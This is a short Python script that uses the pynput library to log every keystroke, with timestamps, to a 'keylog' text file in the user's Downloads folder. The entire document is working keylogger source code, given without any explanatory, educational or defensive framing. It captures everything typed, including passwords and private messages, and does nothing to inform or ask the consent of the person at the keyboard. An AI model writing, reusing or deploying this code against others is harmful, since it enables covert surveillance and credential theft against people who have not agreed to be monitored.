from pynput import keyboard
import os
from datetime import datetime

def generate_log_filename():
   
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"keylog_{timestamp}.txt"
    return os.path.join(os.path.expanduser("~"), "Downloads", filename)


log_file_path = generate_log_filename()


def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f'{datetime.now()} - {key.char}\n') 
    except AttributeError:
        with open(log_file_path, "a") as log_file:
            log_file.write(f'{datetime.now()} - [{key}]\n') 


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
